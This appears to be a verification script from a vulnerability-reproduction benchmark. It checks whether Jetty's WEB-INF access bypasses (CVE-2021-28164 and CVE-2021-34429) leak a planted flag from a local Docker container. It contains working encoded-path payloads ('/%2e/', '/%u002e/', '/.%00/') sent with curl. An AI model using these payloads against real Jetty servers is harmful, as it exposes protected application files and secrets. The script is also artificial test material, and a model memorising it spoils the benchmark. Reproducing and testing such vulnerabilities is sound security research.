#!/usr/bin/env bash
# verify.sh --seed|--residual — jetty-uri-canonicalize-before-authz-webinf
# (CVE-2021-28164 seed / CVE-2021-34429 residual).
#
# seed     /%2e/WEB-INF/pcb-secret.txt     V0(9.4.38) leaks; V1(9.4.39) blocked
# residual /%u002e/WEB-INF/pcb-secret.txt  V1 still leaks (34429; inline)
# 效果通道 = HTTP body of WEB-INF/pcb-secret.txt (= container PCB_FLAG).
# 0=effect  10=blocked/wrong-flag  20=env  30=args
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

# wrong/stale: platform overrides RUN_FLAG; planted canary is RUN_FLAG_REF.
if [[ -n "${RUN_FLAG_REF:-}" && "$RUN_FLAG" != "$RUN_FLAG_REF" ]]; then
  echo "status=rejected(wrong/stale flag)"
  exit 10
fi

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

PORT=""
for _ in $(seq 1 30); do
  PORT="$(dc port "$VERSION" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    if curl -fsS --max-time 5 "http://127.0.0.1:${PORT}/" >/dev/null 2>&1; then
      break
    fi
  fi
  sleep 1
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published $VERSION:8080" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"
BASE="http://127.0.0.1:${PORT}"

probe() {
  local path="$1" body
  body="$(curl --path-as-is -sS -m 15 "$BASE$path")" || { echo "verify: curl failed $path" >&2; return 20; }
  echo "$body"
  if grep -qF "$RUN_FLAG" <<<"$body"; then return 0; else return 10; fi
}

rc=0
if [[ "$MODE" == "--seed" ]]; then
  P="$("$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)" || { echo "original_poc.py 失败" >&2; exit 20; }
  probe "$P"; rc=$?
else
  # residual: CVE-2021-34429 %u002e (GHSA-vjv5); fallback encoded-NUL variant
  for P in "/%u002e/WEB-INF/pcb-secret.txt" "/.%00/WEB-INF/pcb-secret.txt"; do
    probe "$P"; rc=$?
    [[ $rc -eq 0 || $rc -eq 20 ]] && break
  done
fi
echo "verify[$MODE] version=$VERSION rc=$rc" >&2
exit "$rc"
